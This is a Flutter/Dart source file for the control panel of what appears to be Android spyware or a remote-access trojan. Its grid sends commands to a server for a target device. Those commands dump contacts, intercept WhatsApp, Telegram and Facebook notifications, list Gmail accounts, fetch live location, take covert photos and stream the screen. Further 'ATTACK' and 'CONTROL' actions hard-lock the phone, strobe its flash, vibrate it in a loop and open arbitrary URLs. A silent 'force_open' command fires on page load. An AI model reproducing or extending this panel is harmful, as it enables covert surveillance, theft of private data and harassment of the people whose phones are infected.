import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:url_launcher/url_launcher.dart';
import 'api_config.dart';

// ─── Palette (sama dengan Tools Page) ─────────────────────────────────────
class _C {
  static const bg        = Color(0xFF0A0F1A);
  static const surface   = Color(0xFF0D1525);
  static const card      = Color(0xFF111C30);
  static const cardInner = Color(0xFF162035);
  static const border    = Color(0xFF1C2E48);
  static const borderLit = Color(0xFF1E3A5F);
  static const steel     = Color(0xFF1A4F8A);
  static const blueMid   = Color(0xFF2370BE);
  static const blueLight = Color(0xFF4A94E8);
  static const chrome    = Color(0xFF7AB4E8);
  static const frost     = Color(0xFFADD4F5);
  static const red       = Color(0xFFEF4444);
  static const orange = Color(0xFFFF9800);
  static const amber     = Color(0xFFF59E0B);
  static const green     = Color(0xFF22C55E);
  static const purple    = Color(0xFFA78BFA);
  static const pink      = Color(0xFFEC4899);
  static const teal      = Color(0xFF14B8A6);
  static const blue      = Color(0xFF3B82F6);
  static const text      = Color(0xFFDEEEFB);
  static const textSub   = Color(0xFF6A92B8);
  static const textDim   = Color(0xFF2E4E6E);
  static const white     = Color(0xFFFFFFFF);
}

class ControlCenterPage extends StatefulWidget {
  const ControlCenterPage({super.key});

  @override
  State<ControlCenterPage> createState() => _ControlCenterPageState();
}

class _ControlCenterPageState extends State<ControlCenterPage> with SingleTickerProviderStateMixin {
  bool _isSending = false;
  final List<String> _executionLogs = [];

  bool _isStreamingScreen = false;
  String _currentStreamFrame = "";
  StateSetter? _streamStateSetter;

  late AnimationController _glowCtrl;
  int _selectedCategory = 0;

  final List<String> _categories = ["ALL", "INTEL", "LOCATE", "CAMERA", "ATTACK", "CONTROL", "MEDIA"];

  @override
  void initState() {
    super.initState();
    _glowCtrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 1500))..repeat(reverse: true);
    WidgetsBinding.instance.addPostFrameCallback((_) => _triggerAutoWakeup());
  }

  @override
  void dispose() {
    _glowCtrl.dispose();
    super.dispose();
  }

  void _triggerAutoWakeup() {
    final device = ModalRoute.of(context)!.settings.arguments as Map<String, dynamic>?;
    if (device != null && device['id'] != null) {
      _sendCommand("force_open", device['id'].toString(), isSilent: true);
    }
  }

  void _addLog(String message) {
    if (mounted) {
      setState(() {
        _executionLogs.insert(0, "[${DateTime.now().toString().substring(11, 19)}] $message");
        if (_executionLogs.length > 50) _executionLogs.removeLast();
      });
    }
  }

  Future<void> _sendCommand(String command, String targetId, {String? extra, bool isSilent = false}) async {
    if (targetId == "unknown") {
      if (!isSilent) _addLog("Error: ID Target tidak valid");
      return;
    }

    if (!isSilent) setState(() => _isSending = true);
    _addLog("▶ $command → $targetId");

    try {
      final response = await http.post(
        Uri.parse("$baseUrl/api/send-command"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"id": targetId, "command": command, "extra": extra ?? ""}),
      ).timeout(const Duration(seconds: 15));

      if (response.statusCode == 200) {
        _startResponsePolling(command, targetId, isSilent: isSilent);
      } else {
        if (!isSilent) _addLog("✗ Target offline");
      }
    } catch (e) {
      if (!isSilent) _addLog("✗ Koneksi gagal");
    } finally {
      if (!isSilent) setState(() => _isSending = false);
    }
  }

  void _startResponsePolling(String cmd, String targetId, {bool isSilent = false}) async {
    int attempts = 0;
    bool received = false;
    int maxAttempts = isSilent && cmd == "get_screen" ? 15 : 8;

    while (attempts < maxAttempts && !received) {
      await Future.delayed(Duration(milliseconds: isSilent ? 800 : 2000));
      attempts++;

      try {
        final response = await http.get(Uri.parse("$baseUrl/api/get-response/$targetId"));
        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          if (data['data'] != null && data['cmd'] == cmd) {
            _processResponse(cmd, data['data'], targetId);
            received = true;
          }
        }
      } catch (e) {}
    }
    if (!received && !isSilent) _addLog("⚠ Timeout: Target tidak merespon");
  }

  void _processResponse(String cmd, dynamic data, String targetId) {
    if (data == null) return;

    if (cmd == "get_location") {
      _showLocationDialog(data['lat'], data['lng']);
    } else if (cmd == "get_contacts") {
      _showContactsDialog(data['contacts']);
    } else if (cmd == "take_photo") {
      _showCameraResultDialog(data['image_base64']);
    } else if (cmd == "get_screen") {
      _showScreenResultDialog(data['image_base64'] ?? "", targetId);
    } else if (cmd == "get_gmails") {
      _showGmailDialog(data['accounts'] ?? "No Accounts");
    } else if (cmd == "get_notif_logs") {
      _showNotificationLogsDialog(data['logs'] ?? []);
    } else {
      _addLog("✓ $cmd berhasil");
      _showSnackbar("Perintah berhasil");
    }
  }

  void _fetchNotificationLogs(String targetId) async {
    _addLog("Mengambil notifikasi...");
    try {
      final response = await http.get(Uri.parse("$baseUrl/api/get-notifications/$targetId"));
      if (response.statusCode == 200) {
        final List logs = jsonDecode(response.body);
        _showNotificationLogsDialog(logs);
        _addLog("✓ ${logs.length} notifikasi");
      } else {
        _addLog("✗ Database kosong");
      }
    } catch (e) {
      _addLog("✗ Gagal mengambil notifikasi");
    }
  }

  void _showSnackbar(String msg) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text(msg), backgroundColor: _C.blueMid, duration: const Duration(milliseconds: 800)),
    );
  }

  void _showCameraResultDialog(String base64Image) {
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: _C.card,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(24), side: BorderSide(color: _C.border)),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(color: _C.blueMid.withOpacity(0.1), borderRadius: const BorderRadius.only(topLeft: Radius.circular(24), topRight: Radius.circular(24))),
            child: Row(children: [
              Icon(Icons.camera_alt, color: _C.blueLight),
              const SizedBox(width: 8),
              const Text("Instant Photo", style: TextStyle(color: _C.text, fontSize: 16, fontWeight: FontWeight.bold)),
            ]),
          ),
          Padding(
            padding: const EdgeInsets.all(16),
            child: ClipRRect(
              borderRadius: BorderRadius.circular(12),
              child: Image.memory(base64Decode(base64Image), fit: BoxFit.contain, height: 300,
                errorBuilder: (_, __, ___) => Container(height: 300, color: _C.cardInner, child: const Icon(Icons.broken_image, color: _C.red))),
            ),
          ),
          TextButton(onPressed: () => Navigator.pop(context), child: const Text("Close", style: TextStyle(color: _C.blueLight))),
          const SizedBox(height: 8),
        ]),
      ),
    );
  }

  void _showScreenResultDialog(String base64Image, String targetId) {
    _currentStreamFrame = base64Image;
    if (_isStreamingScreen && _streamStateSetter != null) {
      _streamStateSetter!(() {});
      Future.delayed(const Duration(milliseconds: 1000), () {
        if (mounted && _isStreamingScreen) _sendCommand("get_screen", targetId, isSilent: true);
      });
      return;
    }

    _isStreamingScreen = true;
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => StatefulBuilder(
        builder: (context, setDialogState) {
          _streamStateSetter = setDialogState;
          return Dialog(
            backgroundColor: _C.card,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(24), side: BorderSide(color: _C.border)),
            child: Column(mainAxisSize: MainAxisSize.min, children: [
              Container(
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(color: _C.red.withOpacity(0.1), borderRadius: const BorderRadius.only(topLeft: Radius.circular(24), topRight: Radius.circular(24))),
                child: Row(children: [
                  Icon(Icons.live_tv, color: _C.red),
                  const SizedBox(width: 8),
                  const Text("Screen Stream", style: TextStyle(color: _C.text, fontSize: 16, fontWeight: FontWeight.bold)),
                  const Spacer(),
                  AnimatedBuilder(
                    animation: _glowCtrl,
                    builder: (_, __) => Icon(Icons.fiber_manual_record, color: _C.red.withOpacity(0.5 + _glowCtrl.value * 0.5), size: 12),
                  ),
                ]),
              ),
              Padding(
                padding: const EdgeInsets.all(16),
                child: ClipRRect(
                  borderRadius: BorderRadius.circular(12),
                  child: _currentStreamFrame.isNotEmpty
                      ? Image.memory(base64Decode(_currentStreamFrame), fit: BoxFit.contain, height: 400, gaplessPlayback: true)
                      : Container(height: 400, color: _C.cardInner, child: const Center(child: CircularProgressIndicator(color: _C.blueLight))),
                ),
              ),
              const LinearProgressIndicator(color: _C.blueLight),
              TextButton(
                onPressed: () {
                  _isStreamingScreen = false;
                  _streamStateSetter = null;
                  Navigator.pop(context);
                },
                child: const Text("Stop Stream", style: TextStyle(color: _C.red)),
              ),
              const SizedBox(height: 8),
            ]),
          );
        },
      ),
    ).then((_) {
      _isStreamingScreen = false;
      _streamStateSetter = null;
    });
    Future.delayed(const Duration(milliseconds: 500), () {
      if (mounted && _isStreamingScreen) _sendCommand("get_screen", targetId, isSilent: true);
    });
  }

  void _showLocationDialog(dynamic lat, dynamic lng) {
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: _C.card,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(24), side: BorderSide(color: _C.border)),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(color: _C.green.withOpacity(0.1), borderRadius: const BorderRadius.only(topLeft: Radius.circular(24), topRight: Radius.circular(24))),
            child: Row(children: [
              Icon(Icons.location_on, color: _C.green),
              const SizedBox(width: 8),
              const Text("Live Location", style: TextStyle(color: _C.text, fontSize: 16, fontWeight: FontWeight.bold)),
            ]),
          ),
          Padding(
            padding: const EdgeInsets.all(16),
            child: Column(children: [
              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(color: _C.bg, borderRadius: BorderRadius.circular(12), border: Border.all(color: _C.border)),
                child: SelectableText("$lat, $lng", style: TextStyle(color: _C.blueLight, fontSize: 14, fontWeight: FontWeight.bold)),
              ),
              const SizedBox(height: 12),
              ClipRRect(
                borderRadius: BorderRadius.circular(12),
                child: Image.network(
                  "https://static-maps.yandex.ru/1.x/?lang=en_US&ll=$lng,$lat&z=15&l=map&size=400,250",
                  height: 200, fit: BoxFit.cover,
                  errorBuilder: (_, __, ___) => Container(height: 200, color: _C.cardInner, child: const Icon(Icons.map, color: _C.textSub)),
                ),
              ),
              const SizedBox(height: 12),
              Row(mainAxisAlignment: MainAxisAlignment.end, children: [
                TextButton(onPressed: () => Navigator.pop(context), child: const Text("Close", style: TextStyle(color: _C.textSub))),
                TextButton(
                  onPressed: () => launchUrl(Uri.parse("https://www.google.com/maps/search/?api=1&query=$lat,$lng"), mode: LaunchMode.externalApplication),
                  child: const Text("Open Maps", style: TextStyle(color: _C.blueLight)),
                ),
              ]),
            ]),
          ),
        ]),
      ),
    );
  }

  void _showContactsDialog(List contacts) {
    showModalBottomSheet(
      context: context,
      backgroundColor: _C.surface,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
      builder: (context) => DraggableScrollableSheet(
        initialChildSize: 0.6,
        maxChildSize: 0.9,
        expand: false,
        builder: (context, scrollController) => Column(children: [
          Container(margin: const EdgeInsets.symmetric(vertical: 10), width: 40, height: 4, decoration: BoxDecoration(color: _C.border, borderRadius: BorderRadius.circular(10))),
          Padding(padding: const EdgeInsets.all(16), child: Row(children: [
            Icon(Icons.contacts, color: _C.blueLight), const SizedBox(width: 8),
            const Text("Contacts Dump", style: TextStyle(color: _C.text, fontSize: 16, fontWeight: FontWeight.bold)),
            const Spacer(), Text("${contacts.length} contacts", style: TextStyle(color: _C.textSub, fontSize: 12)),
          ])),
          Expanded(
            child: ListView.builder(
              controller: scrollController,
              itemCount: contacts.length,
              itemBuilder: (context, i) => ListTile(
                leading: CircleAvatar(backgroundColor: _C.cardInner, child: Icon(Icons.person, color: _C.blueLight, size: 18)),
                title: Text(contacts[i]['name'] ?? "Unknown", style: const TextStyle(color: _C.text)),
                subtitle: Text(contacts[i]['number'] ?? "No number", style: TextStyle(color: _C.textSub, fontSize: 12)),
              ),
            ),
          ),
        ]),
      ),
    );
  }

  void _showNotificationLogsDialog(List logs) {
    String selectedFilter = "ALL";
    showModalBottomSheet(
      context: context,
      backgroundColor: _C.surface,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
      builder: (context) => StatefulBuilder(
        builder: (context, setModalState) {
          List filtered = logs.where((log) {
            String pkg = log['package']?.toString().toLowerCase() ?? "";
            if (selectedFilter == "WA") return pkg.contains("whatsapp");
            if (selectedFilter == "TELE") return pkg.contains("telegram");
            if (selectedFilter == "FB") return pkg.contains("facebook");
            return true;
          }).toList();
          return DraggableScrollableSheet(
            initialChildSize: 0.8,
            maxChildSize: 0.95,
            expand: false,
            builder: (context, scrollController) => Column(children: [
              Container(margin: const EdgeInsets.symmetric(vertical: 10), width: 40, height: 4, decoration: BoxDecoration(color: _C.border, borderRadius: BorderRadius.circular(10))),
              Padding(padding: const EdgeInsets.all(16), child: Row(children: [
                Icon(Icons.notifications, color: _C.blueLight), const SizedBox(width: 8),
                const Text("Notification Intercept", style: TextStyle(color: _C.text, fontSize: 16, fontWeight: FontWeight.bold)),
              ])),
              SingleChildScrollView(
                scrollDirection: Axis.horizontal,
                padding: const EdgeInsets.symmetric(horizontal: 16),
                child: Row(children: [
                  _filterChip("ALL", Icons.all_inclusive, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                  _filterChip("WA", Icons.chat, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                  _filterChip("TELE", Icons.send, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                  _filterChip("FB", Icons.facebook, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                ]),
              ),
              const SizedBox(height: 10),
              Expanded(
                child: ListView.builder(
                  controller: scrollController,
                  itemCount: filtered.length,
                  itemBuilder: (context, i) {
                    final log = filtered[i];
                    return ListTile(
                      leading: CircleAvatar(backgroundColor: _C.cardInner, child: Icon(Icons.notifications, color: _C.blueLight, size: 16)),
                      title: Text(log['title'] ?? "No title", style: const TextStyle(color: _C.text, fontSize: 13, fontWeight: FontWeight.w600)),
                      subtitle: Text(log['body'] ?? "", style: TextStyle(color: _C.textSub, fontSize: 12), maxLines: 2),
                    );
                  },
                ),
              ),
            ]),
          );
        },
      ),
    );
  }

  Widget _filterChip(String label, IconData icon, String selected, Function(String) onTap) {
    bool isActive = selected == label;
    return GestureDetector(
      onTap: () => onTap(label),
      child: Container(
        margin: const EdgeInsets.only(right: 8),
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 6),
        decoration: BoxDecoration(
          color: isActive ? _C.blueMid : _C.card,
          borderRadius: BorderRadius.circular(20),
          border: Border.all(color: isActive ? _C.blueLight : _C.border),
        ),
        child: Row(children: [
          Icon(icon, size: 14, color: isActive ? Colors.white : _C.textSub),
          const SizedBox(width: 6),
          Text(label, style: TextStyle(color: isActive ? Colors.white : _C.textSub, fontSize: 11)),
        ]),
      ),
    );
  }

  void _showGmailDialog(String emails) {
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: _C.card,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(24), side: BorderSide(color: _C.border)),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(color: _C.red.withOpacity(0.1), borderRadius: const BorderRadius.only(topLeft: Radius.circular(24), topRight: Radius.circular(24))),
            child: Row(children: [
              Icon(Icons.email, color: _C.red),
              const SizedBox(width: 8),
              const Text("Gmail Accounts", style: TextStyle(color: _C.text, fontSize: 16, fontWeight: FontWeight.bold)),
            ]),
          ),
          Padding(
            padding: const EdgeInsets.all(16),
            child: Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(color: _C.bg, borderRadius: BorderRadius.circular(12), border: Border.all(color: _C.border)),
              child: SelectableText(emails, style: TextStyle(color: _C.green, fontSize: 13, fontFamily: 'monospace')),
            ),
          ),
          TextButton(onPressed: () => Navigator.pop(context), child: const Text("Close", style: TextStyle(color: _C.blueLight))),
          const SizedBox(height: 8),
        ]),
      ),
    );
  }

  void _showInputDialog(String title, String cmd, String targetId) {
    TextEditingController textCtrl = TextEditingController();
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: _C.card,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(24), side: BorderSide(color: _C.border)),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(color: _C.blueMid.withOpacity(0.1), borderRadius: const BorderRadius.only(topLeft: Radius.circular(24), topRight: Radius.circular(24))),
            child: Row(children: [
              Icon(Icons.edit_note, color: _C.blueLight),
              const SizedBox(width: 8),
              Text(title, style: const TextStyle(color: _C.text, fontSize: 16, fontWeight: FontWeight.bold)),
            ]),
          ),
          Padding(
            padding: const EdgeInsets.all(16),
            child: TextField(
              controller: textCtrl,
              style: const TextStyle(color: _C.text),
              decoration: InputDecoration(
                hintText: "Enter value...",
                hintStyle: TextStyle(color: _C.textSub),
                enabledBorder: UnderlineInputBorder(borderSide: BorderSide(color: _C.border)),
                focusedBorder: UnderlineInputBorder(borderSide: BorderSide(color: _C.blueLight)),
              ),
            ),
          ),
          Padding(
            padding: const EdgeInsets.all(16),
            child: Row(mainAxisAlignment: MainAxisAlignment.end, children: [
              TextButton(onPressed: () => Navigator.pop(context), child: const Text("Cancel", style: TextStyle(color: _C.textSub))),
              const SizedBox(width: 8),
              ElevatedButton(
                style: ElevatedButton.styleFrom(backgroundColor: _C.blueMid, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
                onPressed: () {
                  _sendCommand(cmd, targetId, extra: textCtrl.text.trim());
                  Navigator.pop(context);
                },
                child: const Text("Send", style: TextStyle(color: Colors.white)),
              ),
            ]),
          ),
        ]),
      ),
    );
  }

  void _showCameraMenu(String targetId) {
    String selectedCam = "back";
    showDialog(
      context: context,
      builder: (context) => StatefulBuilder(
        builder: (context, setInternalState) => Dialog(
          backgroundColor: _C.card,
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(24), side: BorderSide(color: _C.border)),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(color: _C.orange.withOpacity(0.1), borderRadius: const BorderRadius.only(topLeft: Radius.circular(24), topRight: Radius.circular(24))),
              child: Row(children: [
                Icon(Icons.camera_alt, color: _C.orange),
                const SizedBox(width: 8),
                const Text("Select Camera", style: TextStyle(color: _C.text, fontSize: 16, fontWeight: FontWeight.bold)),
              ]),
            ),
            Padding(
              padding: const EdgeInsets.all(16),
              child: Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: [
                _cameraOption(Icons.camera_rear, "Back", "back", selectedCam, (v) => setInternalState(() => selectedCam = v)),
                _cameraOption(Icons.camera_front, "Front", "front", selectedCam, (v) => setInternalState(() => selectedCam = v)),
              ]),
            ),
            Padding(
              padding: const EdgeInsets.all(16),
              child: Row(mainAxisAlignment: MainAxisAlignment.end, children: [
                TextButton(onPressed: () => Navigator.pop(context), child: const Text("Cancel", style: TextStyle(color: _C.textSub))),
                const SizedBox(width: 8),
                ElevatedButton(
                  style: ElevatedButton.styleFrom(backgroundColor: _C.orange, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
                  onPressed: () {
                    _sendCommand("take_photo", targetId, extra: selectedCam);
                    Navigator.pop(context);
                  },
                  child: const Text("Capture", style: TextStyle(color: Colors.white)),
                ),
              ]),
            ),
          ]),
        ),
      ),
    );
  }

  Widget _cameraOption(IconData icon, String label, String value, String current, Function(String) onTap) {
    bool isSelected = value == current;
    return GestureDetector(
      onTap: () => onTap(value),
      child: Column(children: [
        Icon(icon, size: 40, color: isSelected ? _C.orange : _C.textSub),
        const SizedBox(height: 8),
        Text(label, style: TextStyle(color: isSelected ? _C.orange : _C.textSub, fontSize: 12, fontWeight: isSelected ? FontWeight.bold : FontWeight.normal)),
      ]),
    );
  }

  @override
  Widget build(BuildContext context) {
    final device = ModalRoute.of(context)!.settings.arguments as Map<String, dynamic>?;
    final String targetId = device?['id']?.toString() ?? "unknown";
    final String model = device?['model'] ?? "Device";
    final String battery = device?['battery'] ?? "100";

    return Scaffold(
      backgroundColor: _C.bg,
      body: Column(
        children: [
          // Header Premium
          Container(
            padding: const EdgeInsets.fromLTRB(20, 50, 20, 20),
            decoration: BoxDecoration(
              gradient: LinearGradient(colors: [_C.surface, _C.bg], begin: Alignment.topCenter, end: Alignment.bottomCenter),
              borderRadius: const BorderRadius.vertical(bottom: Radius.circular(24)),
            ),
            child: Row(children: [
              GestureDetector(
                onTap: () => Navigator.pop(context),
                child: Container(
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(color: _C.cardInner, borderRadius: BorderRadius.circular(12), border: Border.all(color: _C.border)),
                  child: const Icon(Icons.arrow_back_ios_rounded, color: _C.blueLight, size: 18),
                ),
              ),
              const SizedBox(width: 16),
              Expanded(
                child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                  Text(model, style: const TextStyle(color: _C.text, fontSize: 18, fontWeight: FontWeight.bold)),
                  Row(children: [
                    Icon(Icons.android_rounded, color: _C.blueLight, size: 12),
                    const SizedBox(width: 4),
                    Text(targetId, style: TextStyle(color: _C.textSub, fontSize: 10)),
                  ]),
                ]),
              ),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                decoration: BoxDecoration(color: _C.cardInner, borderRadius: BorderRadius.circular(20), border: Border.all(color: _C.border)),
                child: Row(children: [
                  Icon(Icons.battery_full, color: _C.green, size: 14),
                  const SizedBox(width: 4),
                  Text("$battery%", style: TextStyle(color: _C.green, fontSize: 12, fontWeight: FontWeight.bold)),
                ]),
              ),
              const SizedBox(width: 8),
              if (_isSending)
                const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(strokeWidth: 2, color: _C.blueLight)),
            ]),
          ),
          // Console Log
          Container(
            margin: const EdgeInsets.all(16),
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(color: _C.card, borderRadius: BorderRadius.circular(16), border: Border.all(color: _C.border)),
            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Row(children: [
                Icon(Icons.terminal_rounded, color: _C.blueLight, size: 14),
                const SizedBox(width: 6),
                const Text("CONSOLE", style: TextStyle(color: _C.textSub, fontSize: 10, fontWeight: FontWeight.bold, letterSpacing: 1)),
                const Spacer(),
                GestureDetector(
                  onTap: () => setState(() => _executionLogs.clear()),
                  child: Icon(Icons.delete_sweep_rounded, color: _C.textSub, size: 14),
                ),
              ]),
              const SizedBox(height: 8),
              SizedBox(
                height: 80,
                child: ListView.builder(
                  reverse: true,
                  itemCount: _executionLogs.length,
                  itemBuilder: (context, i) => Text(_executionLogs[i], style: const TextStyle(color: _C.textDim, fontSize: 9, fontFamily: 'monospace')),
                ),
              ),
            ]),
          ),
          // Category Tabs
          Container(
            height: 44,
            margin: const EdgeInsets.symmetric(horizontal: 16),
            child: ListView.separated(
              scrollDirection: Axis.horizontal,
              itemCount: _categories.length,
              separatorBuilder: (_, __) => const SizedBox(width: 8),
              itemBuilder: (_, i) {
                final isActive = _selectedCategory == i;
                return GestureDetector(
                  onTap: () => setState(() => _selectedCategory = i),
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 8),
                    decoration: BoxDecoration(
                      gradient: isActive ? const LinearGradient(colors: [_C.steel, _C.blueMid]) : null,
                      color: isActive ? null : _C.card,
                      borderRadius: BorderRadius.circular(30),
                      border: Border.all(color: isActive ? _C.blueLight : _C.border),
                    ),
                    child: Text(_categories[i], style: TextStyle(color: isActive ? Colors.white : _C.textSub, fontSize: 12, fontWeight: isActive ? FontWeight.bold : FontWeight.normal)),
                  ),
                );
              },
            ),
          ),
          const SizedBox(height: 12),
          // Action Grid
          Expanded(
            child: Padding(
              padding: const EdgeInsets.all(12),
              child: _buildActionGrid(targetId),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildActionGrid(String targetId) {
    final allActions = [
      _ActionItem("Get Contacts", Icons.contacts, _C.purple, () => _sendCommand("get_contacts", targetId), "INTEL"),
      _ActionItem("Notif Intercept", Icons.notifications, _C.purple, () => _fetchNotificationLogs(targetId), "INTEL"),
      _ActionItem("Gmail List", Icons.email, _C.purple, () => _sendCommand("get_gmails", targetId), "INTEL"),
      _ActionItem("Request Access", Icons.security, _C.purple, () => _sendCommand("open_notification_settings", targetId), "INTEL"),
      _ActionItem("Get Location", Icons.my_location, _C.green, () => _sendCommand("get_location", targetId), "LOCATE"),
      _ActionItem("Instant Photo", Icons.camera, _C.orange, () => _showCameraMenu(targetId), "CAMERA"),
      _ActionItem("Screen Stream", Icons.screenshot, _C.orange, () => _sendCommand("get_screen", targetId), "CAMERA"),
      _ActionItem("Set Wallpaper", Icons.image, _C.orange, () => _showInputDialog("Image URL", "set_wallpaper", targetId), "CAMERA"),
      _ActionItem("DDoS WiFi", Icons.sensors_off, _C.red, () => _sendCommand("record_audio", targetId), "ATTACK"),
      _ActionItem("Vibrate", Icons.vibration, _C.red, () => _sendCommand("vibrate_loop", targetId), "ATTACK"),
      _ActionItem("Strobe On", Icons.flash_on, _C.red, () => _sendCommand("flash_strobe", targetId), "ATTACK"),
      _ActionItem("Strobe Off", Icons.flash_off, _C.red, () => _sendCommand("stop_strobe", targetId), "ATTACK"),
      _ActionItem("Lock Hard", Icons.lock, _C.blue, () => _showInputDialog("Lock Message", "hard_lock", targetId), "CONTROL"),
      _ActionItem("Unlock", Icons.lock_open, _C.blue, () => _sendCommand("unlock", targetId), "CONTROL"),
      _ActionItem("Open URL", Icons.link, _C.blue, () => _showInputDialog("Enter URL", "open_url", targetId), "CONTROL"),
      _ActionItem("Play MP3", Icons.play_arrow, _C.teal, () => _showInputDialog("MP3 URL", "play_audio", targetId), "MEDIA"),
      _ActionItem("Stop Sound", Icons.stop, _C.teal, () => _sendCommand("stop_audio", targetId), "MEDIA"),
    ];

    List<_ActionItem> filtered = _selectedCategory == 0 
        ? allActions 
        : allActions.where((a) => a.category == _categories[_selectedCategory]).toList();

    return GridView.builder(
      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 2, crossAxisSpacing: 12, mainAxisSpacing: 12, childAspectRatio: 1.2),
      itemCount: filtered.length,
      itemBuilder: (_, i) {
        final item = filtered[i];
        return GestureDetector(
          onTap: item.onTap,
          child: Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(colors: [_C.card, _C.cardInner]),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: item.color.withOpacity(0.3)),
            ),
            child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
              Container(
                padding: const EdgeInsets.all(14),
                decoration: BoxDecoration(color: item.color.withOpacity(0.1), shape: BoxShape.circle),
                child: Icon(item.icon, color: item.color, size: 28),
              ),
              const SizedBox(height: 12),
              Text(item.label, style: TextStyle(color: _C.text, fontSize: 13, fontWeight: FontWeight.w600)),
              const SizedBox(height: 4),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                decoration: BoxDecoration(color: item.color.withOpacity(0.15), borderRadius: BorderRadius.circular(10)),
                child: Text(item.category, style: TextStyle(color: item.color, fontSize: 8, fontWeight: FontWeight.bold)),
              ),
            ]),
          ),
        );
      },
    );
  }
}

class _ActionItem {
  final String label;
  final IconData icon;
  final Color color;
  final VoidCallback onTap;
  final String category;
  _ActionItem(this.label, this.icon, this.color, this.onTap, this.category);
}